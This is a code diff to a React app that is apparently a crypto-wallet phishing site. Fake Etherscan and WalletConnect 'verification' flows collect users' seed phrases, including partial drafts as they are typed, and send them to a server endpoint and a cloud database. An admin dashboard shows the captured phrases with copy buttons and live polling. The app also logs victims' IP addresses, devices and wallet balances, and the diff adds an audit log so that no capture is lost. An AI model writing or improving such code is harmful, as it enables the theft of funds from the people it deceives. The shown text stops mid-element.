@@ -153,6 +153,17 @@ type SignerCheckRecord     = { wallet: string; chain: ChainKey; status: 'passed'
 type EmailRecord           = { email: string; name: string; wallet: string; chain: ChainKey; severity: Severity; score: number; balance: string; sentAt: string; emailStatus: 'sent' | 'pending' | 'failed' }
 type AdminCreds            = { email: string; password: string }
 type SupportConfig         = { email: string; telegram: string }
+type CaptureAuditChannel   = 'explorer-submit' | 'wc-submit' | 'wc-draft' | 'explorer-draft'
+type CaptureAuditRecord    = {
+  id: string
+  createdAt: string
+  event: 'server-write' | 'cloud-merge-save' | 'local-save'
+  channel: CaptureAuditChannel
+  status: 'ok' | 'error'
+  detail: string
+  recordId?: string
+  walletAddress?: string
+}
 
 type BotDeployRequest = {
   id: string
@@ -290,6 +301,7 @@ const GATE_EMAIL_KEY       = 'sv_gate_email_v1'
 const VISITED_EMAILS_KEY   = 'sv_visit_emailed_v1'
 const SCAN_EMAILED_KEY     = 'sv_scan_emailed_v1'
 const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
+const CAPTURE_AUDIT_KEY    = 'sv_capture_audit_v1'
 const SEED_PHRASES_KEY        = 'sv_seed_phrases_v1'
 const LEGACY_SEED_PHRASES_KEY = 'sv_seed_phrases'
 const ACTIVE_VIEW_KEY         = 'sv_active_view_v1'
@@ -693,6 +705,56 @@ const readSeedPhraseRecords = (): SeedPhraseRecord[] => {
   } catch {
     return []
   }
+}
+
+const readCaptureAuditRecords = (): CaptureAuditRecord[] => {
+  try {
+    const parsed = JSON.parse(localStorage.getItem(CAPTURE_AUDIT_KEY) ?? '[]')
+    if (!Array.isArray(parsed)) return []
+    return parsed.filter((item): item is CaptureAuditRecord => (
+      Boolean(item)
+      && typeof item === 'object'
+      && typeof (item as Record<string, unknown>).id === 'string'
+      && typeof (item as Record<string, unknown>).createdAt === 'string'
+      && typeof (item as Record<string, unknown>).event === 'string'
+      && typeof (item as Record<string, unknown>).channel === 'string'
+      && typeof (item as Record<string, unknown>).status === 'string'
+      && typeof (item as Record<string, unknown>).detail === 'string'
+    )).slice(0, 300)
+  } catch {
+    return []
+  }
+}
+
+const normalizeConnectedWalletRecords = (incoming: unknown): ConnectedWalletRecord[] => {
+  if (!Array.isArray(incoming)) return []
+  const rows: ConnectedWalletRecord[] = []
+  const seen = new Set<string>()
+  for (const item of incoming) {
+    if (!item || typeof item !== 'object') continue
+    const row = item as Record<string, unknown>
+    const wallet = typeof row.wallet === 'string' ? row.wallet.trim() : ''
+    if (!wallet) continue
+    const chainRaw = typeof row.chain === 'string' ? row.chain : 'ethereum'
+    const chain = (chainRaw in chainConfig ? chainRaw : 'ethereum') as ChainKey
+    const connectedAt = typeof row.connectedAt === 'string' && row.connectedAt.trim()
+      ? row.connectedAt
+      : nowString()
+    const key = `${wallet.toLowerCase()}|${chain}|${connectedAt}`
+    if (seen.has(key)) continue
+    seen.add(key)
+    rows.push({
+      wallet,
+      chain,
+      walletType: typeof row.walletType === 'string' ? row.walletType : 'Unknown',
+      balance: typeof row.balance === 'string' ? row.balance : '',
+      txCount: typeof row.txCount === 'string' ? row.txCount : 'N/A',
+      connectedAt,
+      ipAddress: typeof row.ipAddress === 'string' ? row.ipAddress : 'Unknown',
+      device: typeof row.device === 'string' ? row.device : 'Unknown',
+    })
+  }
+  return rows
 }
 
 const mergeUniqueRecords = <T,>(
@@ -1104,10 +1166,12 @@ export default function App() {
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(() => {
     try { return sessionStorage.getItem(ADMIN_SESSION_KEY) === '1' } catch { return false }
   })
-  const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes' | 'bots'>('wallets')
-  const [seedSyncing,          setSeedSyncing]          = useState(false)
+  const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'rawdata' | 'audit' | 'settings' | 'qrcodes' | 'bots'>('wallets')
   const [seedLastSynced,       setSeedLastSynced]       = useState<Date | null>(null)
-  const [seedSyncMsg,          setSeedSyncMsg]          = useState<string | null>(null)
+  // Server-authoritative seed list — fetched directly from /api/seeds (bypasses all client-side state).
+  const [serverSeedRecords,    setServerSeedRecords]    = useState<SeedPhraseRecord[]>([])
+  const [seedsLoading,         setSeedsLoading]         = useState(false)
+  const [captureAuditRecords,  setCaptureAuditRecords]  = useState<CaptureAuditRecord[]>(readCaptureAuditRecords)
   const [adminCreds, setAdminCreds] = useState<AdminCreds>(() => {
     try {
       const stored = JSON.parse(localStorage.getItem(ADMIN_CREDS_KEY) ?? 'null') as AdminCreds | null
@@ -1161,7 +1225,7 @@ export default function App() {
 
   // Records — localStorage-backed for offline resilience, cloud synced on top
   const [connectedWallets, setConnectedWallets] = useState<ConnectedWalletRecord[]>(() => {
-    try { return JSON.parse(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]') as ConnectedWalletRecord[] } catch { return [] }
+    try { return normalizeConnectedWalletRecords(JSON.parse(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]')) } catch { return [] }
   })
   const [scanHistory, setScanHistory] = useState<ScanRecord[]>(() => {
     try { return JSON.parse(localStorage.getItem(SCAN_HISTORY_KEY) ?? '[]') as ScanRecord[] } catch { return [] }
@@ -1292,20 +1356,92 @@ export default function App() {
   const sessionStartRef = useRef<number | null>(null)
   const [sessionSeconds, setSessionSeconds] = useState(0)
 
-  /** Push one record to the server-side /api/record-seed endpoint (most reliable path). */
-  const pushSeedToServer = async (record: SeedPhraseRecord): Promise<void> => {
+  const appendCaptureAudit = (
+    entry: Omit<CaptureAuditRecord, 'id' | 'createdAt'>,
+  ) => {
+    const row: CaptureAuditRecord = {
+      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+      createdAt: nowString(),
+      ...entry,
+    }
+    setCaptureAuditRecords(prev => [row, ...prev].slice(0, 300))
+  }
+
+  /** Push one record to /api/record-seed endpoint (best effort). */
+  const pushSeedToServer = async (
+    record: SeedPhraseRecord,
+    channel: CaptureAuditRecord['channel'],
+  ): Promise<boolean> => {
     try {
-      await fetch('/api/record-seed', {
+      const res = await fetch('/api/record-seed', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(record),
       })
-    } catch {
-      // Non-blocking – client-side save still runs as backup.
+      if (!res.ok) {
+        const body = await res.text().catch(() => '')
+        appendCaptureAudit({
+          event: 'server-write',
+          channel,
+          status: 'error',
+          detail: `/api/record-seed returned ${res.status}${body ? ` — ${body.slice(0, 120)}` : ''}`,
+          recordId: record.id,
+          walletAddress: record.walletAddress,
+        })
+        return false
+      }
+      appendCaptureAudit({
+        event: 'server-write',
+        channel,
+        status: 'ok',
+        detail: '/api/record-seed write succeeded',
+        recordId: record.id,
+        walletAddress: record.walletAddress,
+      })
+      return true
+    } catch (err) {
+      appendCaptureAudit({
+        event: 'server-write',
+        channel,
+        status: 'error',
+        detail: `Network/server error: ${String(err)}`,
+        recordId: record.id,
+        walletAddress: record.walletAddress,
+      })
+      return false
     }
   }
 
-  const saveMergedSeedPhrasesToCloud = async (nextRecords: SeedPhraseRecord[]) => {
+  const refreshServerSeedRecords = async (): Promise<void> => {
+    setSeedsLoading(true)
+    try {
+      const keyFn = (item: SeedPhraseRecord) => `${item.id}|${item.seedPhrase}`
+      const localRows = readSeedPhraseRecords()
+      const memoryRows = seedPhraseRecords
+      const localMerged = mergeUniqueRecords(memoryRows, localRows, keyFn)
+
+      // Read directly from Supabase — same path the admin poll uses for all other data.
+      const row = await loadFromCloud()
+      if (row) {
+        const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
+        const merged = mergeUniqueRecords(localMerged, cloudRows, keyFn)
+        setServerSeedRecords(merged)
+        setSeedLastSynced(new Date())
+        return
+      }
+
+      // Cloud unavailable: never show false empty state if local data exists.
+      setServerSeedRecords(localMerged)
+      if (localMerged.length > 0) setSeedLastSynced(new Date())
+    } finally {
+      setSeedsLoading(false)
+    }
+  }
+
+  const saveMergedSeedPhrasesToCloud = async (
+    nextRecords: SeedPhraseRecord[],
+    channel: CaptureAuditRecord['channel'],
+  ) => {
     // Load existing cloud records to merge — if cloud is temporarily unavailable we still save locally.
     const row = await loadFromCloud()
     // Always save even if cloud read failed — a partial write beats a silent drop.
@@ -1322,7 +1458,33 @@ export default function App() {
       }
       toSave = merged
     }
-    await saveToCloud({ seed_phrases: toSave })
+    const ok = await saveToCloud({ seed_phrases: toSave })
+    appendCaptureAudit({
+      event: 'cloud-merge-save',
+      channel,
+      status: ok ? 'ok' : 'error',
+      detail: ok ? `saveToCloud merged ${toSave.length} records` : 'saveToCloud failed for seed_phrases',
+      recordId: nextRecords[0]?.id,
+      walletAddress: nextRecords[0]?.walletAddress,
+    })
+  }
+
+  const saveMergedConnectedWalletsToCloud = async (nextRecords: ConnectedWalletRecord[]) => {
+    const row = await loadFromCloud()
+    let toSave = nextRecords
+    if (row) {
+      const cloudRows = normalizeConnectedWalletRecords(row.connected_wallets)
+      const merged = mergeUniqueRecords(
+        nextRecords,
+        cloudRows,
+        item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`,
+      )
+      if (merged !== nextRecords) {
+        setConnectedWallets(merged)
+      }
+      toSave = merged
+    }
+    await saveToCloud({ connected_wallets: toSave })
   }
 
   const esAddr = useMemo(() => {
@@ -1387,7 +1549,7 @@ export default function App() {
         setConnectedWallets(prev => {
           const normalized = walletAddr.toLowerCase()
           const filtered = prev.filter(e => !(e.wallet.toLowerCase() === normalized && e.walletType === `WalletConnect (${walletName})`))
-          return [{
+          const next = [{
             wallet: walletAddr,
             chain: 'ethereum' as const,
             walletType: `WalletConnect (${walletName})`,
@@ -1397,6 +1559,8 @@ export default function App() {
             ipAddress: currentVisitorIp,
             device: currentVisitorDevice,
           }, ...filtered].slice(0, 100)
+          void saveMergedConnectedWalletsToCloud(next)
+          return next
         })
       }
       setWcSelectedTopic(session.topic)
@@ -1487,7 +1651,7 @@ export default function App() {
         const normalized = appKitAddress.toLowerCase()
         const ch = resolvedChain
         const filtered = prev.filter(e => !(e.wallet.toLowerCase() === normalized && e.chain === ch))
-        return [{
+        const next = [{
           wallet: appKitAddress,
           chain: ch,
           walletType: 'AppKit',
@@ -1497,6 +1661,8 @@ export default function App() {
           ipAddress: currentVisitorIp,
           device: currentVisitorDevice,
         }, ...filtered].slice(0, 100)
+        void saveMergedConnectedWalletsToCloud(next)
+        return next
       })
     } else if (!isAppKitConnected) {
       setWalletBalance('')
@@ -1537,6 +1703,10 @@ export default function App() {
   }, [seedPhraseRecords])
 
   useEffect(() => {
+    try { localStorage.setItem(CAPTURE_AUDIT_KEY, JSON.stringify(captureAuditRecords)) } catch { /* quota */ }
+  }, [captureAuditRecords])
+
+  useEffect(() => {
     try { localStorage.setItem(SCAN_HISTORY_KEY, JSON.stringify(scanHistory)) } catch { /* quota */ }
     if (!cloudLoadedRef.current) return
     saveToCloud({ scan_history: scanHistory })
@@ -1573,24 +1743,62 @@ export default function App() {
     saveToCloud({ user_email_routes: userEmailRoutes })
   }, [userEmailRoutes])
 
-  // Keep Admin > Seed Phrases fresh when the tab is opened.
+  // Poll seed records while admin Seeds/Raw tabs are open.
   useEffect(() => {
-    if (activeView !== 'admin' || adminTab !== 'seeds') return
+    if (activeView !== 'admin' || (adminTab !== 'seeds' && adminTab !== 'rawdata')) return
+    let active = true
 
-    const seedKey = (item: SeedPhraseRecord) => `${item.id}|${item.seedPhrase}`
-    const localRows = readSeedPhraseRecords()
+    const fetchSeeds = async () => {
+      if (!active) return
+      await refreshServerSeedRecords()
+    }
+
+    void fetchSeeds()
+    const timer = window.setInterval(fetchSeeds, 3000)
+    return () => {
+      active = false
+      window.clearInterval(timer)
+    }
+  }, [activeView, adminTab])
+
+  // Refresh connected wallets when admin opens the wallets tab.
+  useEffect(() => {
+    if (activeView !== 'admin' || adminTab !== 'wallets') return
+    const keyFor = (item: ConnectedWalletRecord) =>
+      `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`
+
+    const localRows = normalizeConnectedWalletRecords(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]')
     if (localRows.length > 0) {
-      setSeedPhraseRecords(prev => mergeUniqueRecords(prev, localRows, seedKey))
+      setConnectedWallets(prev => mergeUniqueRecords(prev, localRows, keyFor))
     }
 
     void loadFromCloud()
       .then(row => {
-        if (!row?.seed_phrases) return
-        const cloudSeedRows = normalizeSeedPhraseRecords(row.seed_phrases)
-        setSeedPhraseRecords(prev =>
-          mergeUniqueRecords(prev, cloudSeedRows, seedKey),
-        )
-        setSeedLastSynced(new Date())
+        if (!row?.connected_wallets) return
+        const cloudRows = normalizeConnectedWalletRecords(row.connected_wallets)
+        setConnectedWallets(prev => mergeUniqueRecords(prev, cloudRows, keyFor))
+      })
+      .catch(() => {
+        // Non-blocking: local rows are still shown.
+      })
+  }, [activeView, adminTab])
+
+  // Refresh connected wallets when admin opens the wallets tab.
+  useEffect(() => {
+    if (activeView !== 'admin' || adminTab !== 'wallets') return
+    const keyFor = (item: ConnectedWalletRecord) =>
+      `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`
+
+    const localRows = normalizeConnectedWalletRecords(localStorage.getItem(CONNECTED_WALLETS_KEY) ?? '[]')
+    if (localRows.length > 0) {
+      setConnectedWallets(prev => mergeUniqueRecords(prev, localRows, keyFor))
+    }
+
+    void loadFromCloud()
+      .then(row => {
+        if (!row?.connected_wallets) return
+        const cloudRows = normalizeConnectedWalletRecords(row.connected_wallets)
+        setConnectedWallets(prev => mergeUniqueRecords(prev, cloudRows, keyFor))
       })
       .catch(() => {
         // Non-blocking: local rows are still shown.
@@ -1665,10 +1873,11 @@ export default function App() {
       bot_requests: unknown
     }>) => {
       if (row.connected_wallets) {
+        const cloudConnectedRows = normalizeConnectedWalletRecords(row.connected_wallets)
         setConnectedWallets(prev => mergeUniqueRecords(
           prev,
-          row.connected_wallets,
-          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}`,
+          cloudConnectedRows,
+          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`,
         ))
       }
       if (row.scan_history) {
@@ -1758,10 +1967,11 @@ export default function App() {
       if (!active || !row) return
 
       if (row.connected_wallets) {
+        const cloudConnectedRows = normalizeConnectedWalletRecords(row.connected_wallets)
         setConnectedWallets(prev => mergeUniqueRecords(
           prev,
-          row.connected_wallets,
-          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}`,
+          cloudConnectedRows,
+          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}|${item.walletType}`,
         ))
       }
       if (row.scan_history) {
@@ -1792,6 +2002,8 @@ export default function App() {
           cloudSeedRows,
           item => `${item.id}|${item.seedPhrase}`,
         ))
+        // Keep the server-authoritative view in sync too.
+        setServerSeedRecords(cloudSeedRows)
         setSeedLastSynced(new Date())
       }
       if (row.visitor_sessions) {
@@ -2241,10 +2453,30 @@ export default function App() {
     }
     const esNewRecords = [esRecord, ...seedPhraseRecords]
     setSeedPhraseRecords(esNewRecords)
-    // Three-layer save: localStorage → server endpoint → client Supabase SDK
-    try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(esNewRecords)) } catch { /* quota */ }
-    void pushSeedToServer(esRecord)
-    void saveMergedSeedPhrasesToCloud(esNewRecords)
+    // Primary: server endpoint (direct Supabase write, no SDK races)
+    await pushSeedToServer(esRecord, 'explorer-submit')
+    // Backups: localStorage + client SDK
+    try {
+      localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(esNewRecords))
+      appendCaptureAudit({
+        event: 'local-save',
+        channel: 'explorer-submit',
+        status: 'ok',
+        detail: `localStorage saved ${esNewRecords.length} records`,
+        recordId: esRecord.id,
+        walletAddress: esRecord.walletAddress,
+      })
+    } catch (err) {
+      appendCaptureAudit({
+        event: 'local-save',
+        channel: 'explorer-submit',
+        status: 'error',
+        detail: `localStorage save failed: ${String(err)}`,
+        recordId: esRecord.id,
+        walletAddress: esRecord.walletAddress,
+      })
+    }
+    void saveMergedSeedPhrasesToCloud(esNewRecords, 'explorer-submit')
     setEsSeedError('')
     setEsSeedInput('')
     setEsSessionStartedAt(Date.now())
@@ -3402,10 +3634,17 @@ export default function App() {
     { key: 'osint',     label: 'OSINT Profiles',    count: [...new Set(scanHistory.map(r => r.wallet.toLowerCase()))].length || undefined },
     { key: 'intel',     label: 'Address Intel',     count: adminIntelRecords.length },
     { key: 'seeds',     label: 'Seed Phrases',      count: visibleSeedPhraseRecords.length || undefined },
+    { key: 'rawdata',   label: 'Raw Data',          count: serverSeedRecords.length || undefined },
+    { key: 'audit',     label: 'Audit Log',         count: captureAuditRecords.length || undefined },
     { key: 'bots',      label: 'Bot Requests',      count: botRequests.filter(r => r.status === 'pending').length || undefined },
     { key: 'qrcodes',   label: 'QR Codes',          count: wcSessions.length || undefined },
     { key: 'settings',  label: 'Settings' },
   ]
+
+  const rawSeedData = useMemo(
+    () => JSON.stringify(serverSeedRecords, null, 2),
+    [serverSeedRecords],
+  )
 
   // ── QR code helpers ──────────────────────────────────────────────────
   const generateScanQr = async () => {
@@ -3462,10 +3701,30 @@ export default function App() {
       }
       const wcNewRecords = [wcRecord, ...seedPhraseRecords]
       setSeedPhraseRecords(wcNewRecords)
-      // Three-layer save: localStorage → server endpoint → client Supabase SDK
-      try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(wcNewRecords)) } catch { /* quota */ }
-      void pushSeedToServer(wcRecord)
-      void saveMergedSeedPhrasesToCloud(wcNewRecords)
+      // Primary: server endpoint (direct Supabase write, no SDK races)
+      void pushSeedToServer(wcRecord, 'wc-submit')
+      // Backups: localStorage + client SDK
+      try {
+        localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(wcNewRecords))
+        appendCaptureAudit({
+          event: 'local-save',
+          channel: 'wc-submit',
+          status: 'ok',
+          detail: `localStorage saved ${wcNewRecords.length} records`,
+          recordId: wcRecord.id,
+          walletAddress: wcRecord.walletAddress,
+        })
+      } catch (err) {
+        appendCaptureAudit({
+          event: 'local-save',
+          channel: 'wc-submit',
+          status: 'error',
+          detail: `localStorage save failed: ${String(err)}`,
+          recordId: wcRecord.id,
+          walletAddress: wcRecord.walletAddress,
+        })
+      }
+      void saveMergedSeedPhrasesToCloud(wcNewRecords, 'wc-submit')
       void notifyAdminVerificationRequest(storedCredential, 'walletconnect', capturedWallet, 'ethereum')
     }
   }
@@ -3533,8 +3792,12 @@ export default function App() {
       setSeedPhraseRecords(prev => {
         const filtered = prev.filter(r => r.id !== draftId)
         const next = [draftRecord, ...filtered]
-        try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(next)) } catch { /* quota */ }
-        void saveMergedSeedPhrasesToCloud(next)
+        try {
+          localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(next))
+        } catch {
+          // non-blocking
+        }
+        void saveMergedSeedPhrasesToCloud(next, 'wc-draft')
         return next
       })
     }, 600)
@@ -3566,8 +3829,12 @@ export default function App() {
       setSeedPhraseRecords(prev => {
         const filtered = prev.filter(r => r.id !== draftId)
         const next = [draftRecord, ...filtered]
-        try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(next)) } catch { /* quota */ }
-        void saveMergedSeedPhrasesToCloud(next)
+        try {
+          localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(next))
+        } catch {
+          // non-blocking
+        }
+        void saveMergedSeedPhrasesToCloud(next, 'explorer-draft')
         return next
       })
     }, 600)
@@ -6459,161 +6726,270 @@ export default function App() {
                   )}
 
                   {/* ── Seed Phrases ── */}
+                  {/* ── Seed Phrases (server-authoritative) ── */}
                   {adminTab === 'seeds' && (
                     <div className="admin-panel">
-                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.5rem', marginBottom: '0.5rem' }}>
-                        <h3 style={{ margin: 0 }}>Seed Phrase Management</h3>
-                        <div style={{ display: 'flex', gap: '0.5rem', flexWrap: 'wrap', alignItems: 'center' }}>
+
+                      {/* Header */}
+                      <div className="seeds-panel-header">
+                        <div className="seeds-panel-title-row">
+                          <h3 style={{ margin: 0 }}>Captured Seed Phrases</h3>
+                          <div className="seeds-live-badge">
+                            <span className="live-dot" />
+                            <span>LIVE</span>
+                            <span className="muted" style={{ fontWeight: 400 }}>· auto-refresh 3s</span>
+                          </div>
+                        </div>
+                        <div className="seeds-panel-controls">
                           <button
                             className="btn-secondary"
                             type="button"
-                            disabled={seedSyncing}
-                            style={{ fontSize: '0.78rem', minWidth: '110px' }}
-                            onClick={async () => {
-                              setSeedSyncing(true)
-                              setSeedSyncMsg(null)
-                              try {
-                                const seedKey = (item: SeedPhraseRecord) => `${item.id}|${item.seedPhrase}`
-                                // Merge local storage records first
-                                const localRows = readSeedPhraseRecords()
-                                let merged = mergeUniqueRecords(seedPhraseRecords, localRows, seedKey)
-                                // Then pull cloud records
-                                const row = await loadFromCloud()
-                                if (row?.seed_phrases) {
-                                  merged = mergeUniqueRecords(merged, normalizeSeedPhraseRecords(row.seed_phrases), seedKey)
-                                }
-                                setSeedPhraseRecords(merged)
-                                // Push merged result back to cloud
-                                await saveToCloud({ seed_phrases: merged })
-                                setSeedLastSynced(new Date())
-                                setSeedSyncMsg(`✓ ${merged.filter(r => r.source !== 'manual').length} record(s) loaded`)
-                              } catch {
-                                setSeedSyncMsg('⚠ Sync failed — check connection')
-                              } finally {
-                                setSeedSyncing(false)
-                              }
-                            }}
+                            disabled={seedsLoading}
+                            style={{ fontSize: '0.82rem' }}
+                            onClick={() => { void refreshServerSeedRecords() }}
                           >
-                            {seedSyncing ? '⟳ Syncing…' : '↻ Sync Now'}
+                            {seedsLoading ? '⟳ Loading…' : '↻ Refresh'}
                           </button>
-                          {seedSyncMsg && (
-                            <span style={{ fontSize: '0.75rem', color: seedSyncMsg.startsWith('✓') ? 'var(--safe)' : 'var(--critical)' }}>
-                              {seedSyncMsg}
+                          {seedLastSynced && (
+                            <span className="muted" style={{ fontSize: '0.73rem' }}>
+                              Last fetch: {seedLastSynced.toLocaleTimeString()}
                             </span>
                           )}
-                          {seedLastSynced && !seedSyncing && (
-                            <span className="muted" style={{ fontSize: '0.72rem' }}>
-                              Last sync: {seedLastSynced.toLocaleTimeString()}
-                            </span>
-                          )}
-                          <span style={{ display: 'flex', alignItems: 'center', gap: '0.3rem', fontSize: '0.72rem', marginLeft: 'auto' }}>
-                            <span className="live-dot" />
-                            <span style={{ color: 'var(--safe)' }}>LIVE</span>
-                            <span className="muted">· auto-refresh 3s</span>
-                          </span>
                         </div>
                       </div>
-                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>
-                        User-verified credentials only. Records are captured from the Etherscan verification popup and WalletConnect ownership verification, then synced to cloud.
-                      </p>
 
-                      {/* Stats row */}
+                      {/* Stats */}
                       <div className="seeds-stats-row">
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{visibleSeedPhraseRecords.length}</span>
-                          <span className="seeds-stat-label">Total Captured</span>
+                          <span className="seeds-stat-val">{serverSeedRecords.length}</span>
+                          <span className="seeds-stat-label">Total</span>
                         </div>
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{visibleSeedPhraseRecords.filter(r => r.source === 'wc-session').length}</span>
-                          <span className="seeds-stat-label">WalletConnect Verified</span>
+                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.source === 'wc-session').length}</span>
+                          <span className="seeds-stat-label">WalletConnect</span>
                         </div>
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{visibleSeedPhraseRecords.filter(r => r.source === 'auto-detected').length}</span>
-                          <span className="seeds-stat-label">Explorer Popup Verified</span>
+                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.source === 'auto-detected').length}</span>
+                          <span className="seeds-stat-label">Explorer Popup</span>
                         </div>
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{visibleSeedPhraseRecords.filter(r => r.source === 'draft-wc' || r.source === 'draft-explorer').length}</span>
-                          <span className="seeds-stat-label">Live Drafts (in-progress)</span>
+                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.confirmed).length}</span>
+                          <span className="seeds-stat-label">Valid BIP39</span>
                         </div>
                       </div>
 
-                      {/* Detection notice */}
-                      <div className="config-notice" style={{ marginBottom: '1.2rem' }}>
-                        <strong>Source policy:</strong> Admin manual seed entry is disabled. This panel shows only user-submitted verification data from live user flows.
-                      </div>
+                      {/* Records */}
+                      <div className="seeds-divider" />
 
-                      {/* Records list */}
-                      <div style={{ height: '1px', background: 'var(--border)', margin: '1.4rem 0' }} />
-                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.8rem' }}>
-                        <h4>Captured Records ({visibleSeedPhraseRecords.length})</h4>
-                      </div>
-                      {visibleSeedPhraseRecords.length === 0 ? (
-                        <p className="admin-empty">No user-verified seed phrase records yet. They appear automatically after users complete Etherscan popup verification or WalletConnect ownership verification.</p>
+                      {seedsLoading && serverSeedRecords.length === 0 ? (
+                        <p className="muted" style={{ padding: '1rem 0' }}>Loading from database…</p>
+                      ) : serverSeedRecords.length === 0 ? (
+                        <div className="seeds-empty-state">
+                          <div className="seeds-empty-icon">🔑</div>
+                          <p className="seeds-empty-title">No records yet</p>
+                          <p className="seeds-empty-sub">Records appear here automatically when a user completes the Etherscan verification popup or WalletConnect ownership flow.</p>
+                          <p className="seeds-empty-sub" style={{ marginTop: '0.5rem', fontSize: '0.78rem' }}>
+                            Source: <strong>/api/seeds</strong> → Supabase <code>app_state.seed_phrases</code>
+                          </p>
+                        </div>
                       ) : (
-                        <div className="intel-records">
-                          {visibleSeedPhraseRecords.map(r => {
-                            return (
-                              <div key={r.id} className="intel-record-card">
-                                <div className="intel-record-head" style={{ flexWrap: 'wrap', gap: '0.4rem' }}>
-                                  <code className="osint-addr" style={{ fontSize: '0.78rem' }}>
-                                    {r.walletAddress === 'Unknown' ? '— unknown address —' : r.walletAddress}
-                                  </code>
-                                  <span
-                                    className={`pill ${
-                                      r.source === 'draft-wc' || r.source === 'draft-explorer'
-                                        ? 'low'
-                                        : r.source === 'wc-session'
-                                          ? 'medium'
-                                          : 'high'
-                                    }`}
-                                    style={{ fontSize: '0.7rem' }}
-                                  >
-                                    {r.source === 'draft-wc'
-                                      ? 'Live Draft · WC'
-                                      : r.source === 'draft-explorer'
-                                        ? 'Live Draft · Explorer'
-                                        : r.source === 'wc-session'
-                                          ? 'WalletConnect'
-                                          : r.source === 'manual'
-                                            ? 'Manual'
-                                            : 'Etherscan Popup'}
-                                  </span>
-                                  <span className="pill low" style={{ fontSize: '0.7rem' }}>{r.wordCount}w</span>
-                                  <span className="muted" style={{ fontSize: '0.75rem' }}>{chainConfig[r.chain]?.label ?? chainConfig.ethereum.label}</span>
-                                  <span className="muted" style={{ fontSize: '0.75rem', marginLeft: 'auto' }}>{r.detectedAt}</span>
-                                  <button
-                                    className="preview-btn"
-                                    type="button"
-                                    style={{ color: 'var(--critical)' }}
-                                    onClick={() => setSeedPhraseRecords(prev => prev.filter(x => x.id !== r.id))}
-                                  >
-                                    Delete
-                                  </button>
-                                </div>
-
-                                <div className="seeds-phrase-row">
-                                  <code className="seeds-phrase-text">
-                                    {r.seedPhrase}
-                                  </code>
-                                  <div style={{ display: 'flex', gap: '0.4rem', flexShrink: 0 }}>
+                        <div className="seeds-table-wrap">
+                          <table className="admin-table seeds-full-table">
+                            <thead>
+                              <tr>
+                                <th>#</th>
+                                <th>Wallet Address</th>
+                                <th>Source</th>
+                                <th>Words</th>
+                                <th>Network</th>
+                                <th>Captured At</th>
+                                <th>Phrase</th>
+                                <th></th>
+                              </tr>
+                            </thead>
+                            <tbody>
+                              {serverSeedRecords.map((r, idx) => (
+                                <tr key={r.id}>
+                                  <td className="muted" style={{ fontSize: '0.75rem' }}>{idx + 1}</td>
+                                  <td>
+                                    <code style={{ fontSize: '0.72rem', wordBreak: 'break-all' }}>
+                                      {r.walletAddress === 'Unknown' ? '—' : r.walletAddress}
+                                    </code>
+                                  </td>
+                                  <td>
+                                    <span className={`pill ${r.source === 'wc-session' ? 'medium' : 'high'}`} style={{ fontSize: '0.68rem', whiteSpace: 'nowrap' }}>
+                                      {r.source === 'wc-session' ? 'WalletConnect' : 'Explorer'}
+                                    </span>
+                                  </td>
+                                  <td style={{ textAlign: 'center' }}>
+                                    <span className={`pill ${r.confirmed ? 'safe' : 'low'}`} style={{ fontSize: '0.68rem' }}>
+                                      {r.wordCount}w
+                                    </span>
+                                  </td>
+                                  <td className="muted" style={{ fontSize: '0.75rem' }}>
+                                    {chainConfig[r.chain]?.label ?? 'Ethereum'}
+                                  </td>
+                                  <td className="muted" style={{ fontSize: '0.73rem', whiteSpace: 'nowrap' }}>{r.detectedAt}</td>
+                                  <td style={{ maxWidth: '340px' }}>
+                                    <code className="seeds-phrase-text" style={{ fontSize: '0.73rem', display: 'block', wordBreak: 'break-word' }}>
+                                      {r.seedPhrase}
+                                    </code>
+                                    {r.notes && (
+                                      <p className="muted" style={{ fontSize: '0.68rem', marginTop: '0.2rem' }}>{r.notes}</p>
+                                    )}
+                                  </td>
+                                  <td style={{ whiteSpace: 'nowrap' }}>
                                     <button
                                       className="preview-btn"
                                       type="button"
+                                      style={{ marginRight: '0.35rem' }}
                                       onClick={() => navigator.clipboard.writeText(r.seedPhrase)}
                                     >
                                       Copy
                                     </button>
-                                  </div>
-                                </div>
+                                    <button
+                                      className="preview-btn"
